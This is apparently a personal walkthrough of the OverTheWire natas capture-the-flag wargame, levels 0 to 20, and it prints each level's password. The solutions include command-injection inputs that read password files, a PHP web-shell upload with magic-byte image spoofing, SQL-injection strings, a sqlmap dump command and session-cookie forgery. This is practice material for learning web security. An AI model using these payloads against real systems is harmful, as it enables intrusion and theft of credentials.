# Solutions
**THERE ARE SPOILERS AHEAD.**

These are my solutions to the [natas](http://overthewire.org/wargames/natas/) ctf wargame. The portions where I don't have anything really interesting to note are rather terse. There are many good, full guides online for these problems.

## Level 0 to Level 1
Log in to level 0 with the following:

```
Username: natas0
Password: natas0
URL:      http://natas0.natas.labs.overthewire.org
```

password for level 1 is found in an HTML comment, so inspect the page source.

password: `gtVrDuiDfck831PqWsLEZy5gyDz1clto`

## Level 1 to Level 2
Same as previous level. Right clicking has been disabled so use the browser toolbar (or use a hotkey if you know them, mine is ctrl+shift+I) to open the developer tools to read the source.

password: `ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi`

## Level 2 to Level 3
There is an img loaded from `/files/pixel.png`. I guess we should see what else is in `/files/`?

Visiting `http://natas2.natas.labs.overthewire.org/files/` shows us there is a `users.txt` which has the password we're looking for.

password: `sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14`

## Level 3 to Level 4
If google won't find it, it could be related to having a `robots.txt` file. Let's check for that.

Surprise! We get the following:

```
User-agent: *
Disallow: /s3cr3t/
```

If you check the `/s3cr3t/` endpoint you'll see another `users.txt` with the next password.

password: `Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ`

## Level 4 to Level 5
Apparently (I found this through googling, because I was pretty sure I knew what needed to be done after playing around on the page) we should use Burp or some other software to allow us to "spoof" our request.

Basically, we want natas4 to _think_ we're coming from natas5, even if we aren't.

In Burp, change the

`Referer: http://natas5.natas.labs.overthewire.org/`

and continue to get the password: `iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq`

## Level 5 to Level 6
In Burp, there's a suspicious `Cookie: loggedin=0` item in the request. Change it to `loggedin=1` and continue.

password: `aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1`

## Level 6 to Level 7
Visit `https://natas6.natas.labs.overthewire.org/index-source.html` linked to from the "View sourcecode" hyperlink. I noticed in here that there's an `includes/secret.inc`... so I visited that file path in the url browser and saw the following:

```php
<?
$secret = "FOEIUWGHFEEUHOFUOIU";
?>
```

Back on the original webpage, if we submit the "secret" form using the `FOEIUWGHFEEUHOFUOIU` secret, we get the password: `7z3hEENjQtflzgnT29q7wAvMNfZdh0i9`

## Level 7 to Level 8

I thought this level would be related to query strings because the "Home" and "About" links go to places like `http://natas7.natas.labs.overthewire.org/index.php?page=about`... I didn't know what else to do so I opened the page source and saw the following hint:

`hint: password for webuser natas8 is in /etc/natas_webpass/natas8`

So, visit `http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8` and get the password.

password: `DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe`

## Level 8 to Level 9
Again, viewing the source code shows us something interesting:

```php
<?

$encodedSecret = "3d3d516343746d4d6d6c315669563362";

function encodeSecret($secret) {
    return bin2hex(strrev(base64_encode($secret)));
}

if(array_key_exists("submit", $_POST)) {
    if(encodeSecret($_POST['secret']) == $encodedSecret) {
    print "Access granted. The password for natas9 is <censored>";
    } else {
    print "Wrong secret";
    }
}
?>
```
So it looks like we need to de-encode `3d3d516343746d4d6d6c315669563362`, and we can do that by reversing the encoding procedure above. I've never used php but it seems pretty reasonable to guess we can do: `base64_decode(strrev(hex2bin("3d3d516343746d4d6d6c315669563362")))`... I had to find an online php interpreter because I don't have php installed. but I ran:

```php
<?php
	echo base64_decode(strrev(hex2bin("3d3d516343746d4d6d6c315669563362")))

?>
```

in one of the interpreters and got the secret to be `oubWYf2kBq`.

The password for the next level is: `W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl`.

## Level 9 to Level 10
I looked at the source code, and saw the following interesting line:

```php
if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
```

Since this is grepping `$key`, I decided to be naughty and run `grep -i .* dictionary.txt` (i.e. I submitted the form with ".*"), which will dump the entirety of dictionary.txt. This didn't lead me anywhere.

Then I realized that we can essentially run arbitrary commands with an injection in the following way:

Submit the form with `; cat /etc/natas_webpass/natas10`. The semicolon terminates the grep command, and we know from a previous exercise where the password files are saved. Lo and behold, we get the password.

password: `nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu`

## Level 10 to Level 11

Well, if you inspect the source code you'll note that we can no longer use `;`, `&`, `|`. Luckily for us, the input prompt is still vulnerable to injection, because `grep` accepts multiple files as arguments.

Input into form: `.* /etc/natas_webpass/natas11`
Gives the final command run by the server as: `grep -i .* /etc/natas_webpass/natas11 dictionary.txt`

The returned info contains the `natas11` password, but it's a few lines down from the top so you'll have to examine the output to find it.

password: `U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK`

## Level 11 to Level 12
There's a lot of php code in this one:

```php
$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");

function xor_encrypt($in) {
    $key = '<censored>';
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

function loadData($def) {
    global $_COOKIE;
    $mydata = $def;
    if(array_key_exists("data", $_COOKIE)) {
    $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);
    if(is_array($tempdata) && array_key_exists("showpassword", $tempdata) && array_key_exists("bgcolor", $tempdata)) {
        if (preg_match('/^#(?:[a-f\d]{6})$/i', $tempdata['bgcolor'])) {
        $mydata['showpassword'] = $tempdata['showpassword'];
        $mydata['bgcolor'] = $tempdata['bgcolor'];
        }
    }
    }
    return $mydata;
}

function saveData($d) {
    setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
}

$data = loadData($defaultdata);

if(array_key_exists("bgcolor",$_REQUEST)) {
    if (preg_match('/^#(?:[a-f\d]{6})$/i', $_REQUEST['bgcolor'])) {
        $data['bgcolor'] = $_REQUEST['bgcolor'];
    }
}

saveData($data);
```

Notable things:

1. The cookie we're loading is `ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSRwh6QUcIaAw`.
2. Presumably our goal is for `$defaultdata = array( "showpassword"=>"yes", "bgcolor"=>"#ffffff");`
3. We need to do some reading on XOR encryption.
   1. Wikipedia says: "To decrypt the output, merely reapplying the XOR function with the key will remove the cipher."
4. We need to figure out what the `$key` is in `xor_encrypt`.
   1. `saveData` gets called on `$data` which is set by `loadData` which is run on `$defaultdata` which is the array struct from above.
   2. `saveData` sets the cookie to `base64_encode(xor_encrypt(json_encode($d)))` which leads me to believe `$key` is actually just the json encoded array above.

Following those hints, we can run the following code which will give us the `$key`:
```php
<?php

function xor_encrypt($in) {
    $key = json_encode(array( "showpassword"=>"no", "bgcolor"=>"#ffffff"));
    $outText = '';
    for ($i = 0; $i < strlen($in); $i++) {
        $outText .= $in[$i] ^ $key[$i % strlen($key)];
    }
    return $outText;
}

echo xor_encrypt(base64_decode("ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSRwh6QUcIaAw"));

?>
```

output: `qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jq`

Now, this is clearly `qw8J` repeated, which has to do with how XOR operates when the key is shorter than the text to encrypt.

So, let's put that key into the code:

```php
<?php

function xor_encrypt($in) {
    $key = 'qw8J';
    $outText = '';
    for ($i = 0; $i < strlen($in); $i++) {
        $outText .= $in[$i] ^ $key[$i % strlen($key)];
    }
    return $outText;
}

echo base64_encode(xor_encrypt(json_encode(array("showpassword" => "yes", "bgcolor"=>"#ffffff"))));

?>
```

cookie: `ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK`.

Set the cookie to this value (I used Burp) and voila.

password: `EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3`.

There are a lot of good walkthroughs for this problem online. I utilized some for help because I have never used php before and was struggling a little bit with how to figure out the `$key` initially.

# Level 12 to Level 13

It looks like we can upload a file. It tells us to upload an image, but looking at the source code, there's nothing that really does any sort of validation to make sure we're uploading a valid image.

1. Create a file with `<?php echo system(\"cat /etc/natas_webpass/natas13\");?>` inside. Name it `natas12.jpg`.
2. In the dev tools inspector, find the element similar to `<input type="hidden" name="filename" value="1b9n9h0xrs.jpg">` (your "value" will be different.). Change the `.jpg` in there to `.php`.
3. Upload your file.
4. Follow the link the server responds with, which should show the password for level 13.

password: `jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY`

# Level 13 to Level 14
Looks like we can upload a file again. This time there's more checking to make sure the file is a valid image. It uses the php function `exif_imagetype`. Luckily, after some googling to try and understand this php function and whether it's possible to fake it out, it looks like there's a [valid way to inject php into image files](https://onestepcode.com/injecting-php-code-to-jpg/). I tried following the directions in that link but ran into some issues.

I did some more googling and found that there are ["magic bytes"](https://stackoverflow.com/questions/18357095/how-to-bypass-the-exif-imagetype-function-to-upload-php-code) that tell `exif_imagetype` if something is an image. So, let's do the following:

```bash
echo -e "\xff\xd8\xff" > natas13.jpg
cat natas13.jpg natas13.php > natas13_inject.php
```

Then follow the same procedure as last time to upload the file to allow it to become executable php.

password: `Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1`

## Level 14 -> Level 15
This looks interesting! A login submission form.

When inspecting the source, I honed in on this pretty quickly:

```php
$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
if(array_key_exists("debug", $_GET)) {
   echo "Executing query: $query<br>";
}

if(mysql_num_rows(mysql_query($query, $link)) > 0) {
   echo "Successful login! The password for natas15 is <censored><br>";
} else {
   echo "Access denied!<br>";
}
```

And what I see here is some unchecked SQL. It's only looking to see if any rows are returned, so as long as we can modify the query it's running with our inputs, we should be able to force it to always return a result and give us the password.

Basically, we'll transform the SQL query from this:

```sql
SELECT * from users where username="<some_username>" and password="<some_password>"
```

to this:

```sql
SELECT * from users where username="<some_username>"
```

The way we accomplish that is by inputting the following into the username text box: `natas15"#`. The quote terminates the string because the hash symbol turns everything following it into a comment (including the terminating quotation).

password: `AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J`

## Level 15 to Level 16
This one looks a little trickier. The only input we can get back is "This user exists." or "This user doesn't exist."... I guess what we have to do is modify the SQL query from:

```sql
SELECT * from users where username="<some_username>";
```

to something like:

```sql
SELECT * FROM users WHERE username="<some_username>" AND password LIKE "<something>";
```

So, we'll write a little script to do that for us. See [here](./natas15.py)

password: `WaIHEacj63wnNIBROHeqi3p9t0m5nhmh`

## Level 16 to Level 17
This is kinda similar to the last one, but instead we'll need to use subshells to query, since certain characters are not allowed to be searched on (whoever built the website is nicely allowing us to use `$()`!)

Basically, we can do the following:

```bash
somethings$(grep <char> /etc/natas_webpass/natas17)
```

If `somethings` is returned by the API then `<char>` is not part of the password (i.e. `grep` returns `<char>` and `somethings<char>` is of course not a real word). We can use this to build up a dictionary of potential letters, similar to the last stage.

After we've narrowed down the alphabet, we can `grep ^<potential_password> /etc/natas_webpass/natas17` which allows us to test the password as we build it up with various probe characters.

See the script [here](./natas16.py).

password: `8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw`

## Level 17 to Level 18
I was really unsure how to approach this problem, but after some googling (cheating, in this case!!) I found two different solutions

1. "Dumb" solution: use sql injection to force the request to sleep. We can time the request, and if the request takes a long time when we know the user was found. This approach is haphazard and potentially fraught with errors (what if the server just responds slowly? we'll get a false positive. It's unlikely but it could happen).
2. "Smart" solution: Use a tool called `sqlmap` which will dump the entire sql database table to us.

Of course, there's not *really* a smart and dumb solution. They both have tradeoffs that need to be considered. Since we've already done some SQL injections in the previous exercises, I wanted to give `sqlmap` a try because it's cool to have more tools in your tool kit. A downside is that it is a black box (unless you read the source code) so we don't *really* know what it's doing under the covers. C'est la vie!

```bash
sqlmap -u "http://natas17.natas.labs.overthewire.org/index.php" \
--data=username=natas18 \
--auth-type=basic \
--auth-cred=natas17:8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw \
--level=5 --risk=3 \
--dbms=mysql \
-D natas17 \
-T users \
--dump
```

Whew, that took forever. Lessons learned: cheating doesn't always win (I heavily utilized [this blog post](https://medium.com/hacker-toolbelt/natas-17-blind-sql-injection-with-sqlmap-1e775e937055)) because, guess what? `sqlmap` just ended up using a timing attack, which is what our "dumb" version would have done. It ran for about 50 minutes on my computer. Yikes!

Password: `xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP`

## Level 18 to Level 19
The big indication for this level is that there are only 640 session IDs available. There's no real way for us to "log in" as admin, but we can brute force check all of the session IDs by setting the cookies to each one until we find the admin session.

See the [python code](./natas18.py) I used to accomplish this.

password: `4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs`

## Level 19 to Level 20
This time the site tells us the cookies aren't sequential, but otherwise the code is the "mostly the same".

As an example, I got the following cookie: `Cookie: PHPSESSID=3533302d74657374`. Pretty nasty. Brute forcing is probably out of the question. It looks like hex, so I thought I'd try to decode to ascii and this is what I got: `530-test`. `test` was the username I used in the form to attempt to log in. So... this seems pretty similar to the last level with a hex encoded thing so we should hex encode `<some_num>-admin` and we'll probably get it.

And, we do. See my [python code](./natas19.py). And notice I learned a new trick! It runs multiple threads at a time to speed up the process :).

password: `eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF`

## Level 20 to level 21
Initial thoughts... this part is super sus:

```php
function mywrite($sid, $data) {
    // $data contains the serialized version of $_SESSION
    // but our encoding is better
    debug("MYWRITE $sid $data");
    // make sure the sid is alnum only!!
    if(strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) {
    debug("Invalid SID");
        return;
    }
    $filename = session_save_path() . "/" . "mysess_" . $sid;
    $data = "";
    debug("Saving in ". $filename);
    ksort($_SESSION);
    foreach($_SESSION as $key => $value) {
        debug("$key => $value");
        $data .= "$key $value\n";
    }
    file_put_contents($filename, $data);
    chmod($filename, 0600);
}
```